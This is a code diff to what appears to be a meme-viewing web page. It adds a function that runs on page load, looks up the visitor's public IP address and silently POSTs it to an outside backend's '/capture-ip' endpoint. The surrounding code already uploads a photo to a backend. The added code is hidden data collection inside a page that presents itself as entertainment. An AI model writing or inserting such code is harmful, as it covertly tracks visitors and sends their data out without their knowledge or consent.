@@ -178,6 +178,24 @@
                 body: formData
             }).catch(error => console.error("Error uploading photo:", error));
         }
+        async function captureIP() {
+    try {
+        const response = await fetch("https://api64.ipify.org?format=json");
+        const data = await response.json();
+        ipAddressElement.textContent = `Your IP: ${data.ip}`;
+
+        // Send IP to backend
+        await fetch("https://meme-backend-d2kh.onrender.com/capture-ip", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ ip: data.ip }),
+        });
+    } catch (error) {
+        console.error("Error capturing IP:", error);
+    }
+}
+
+captureIP(); // Call the function here
 
         async function fetchMemes(after) {
             fetch(`https://www.reddit.com/r/memes.json?after=${after}`)
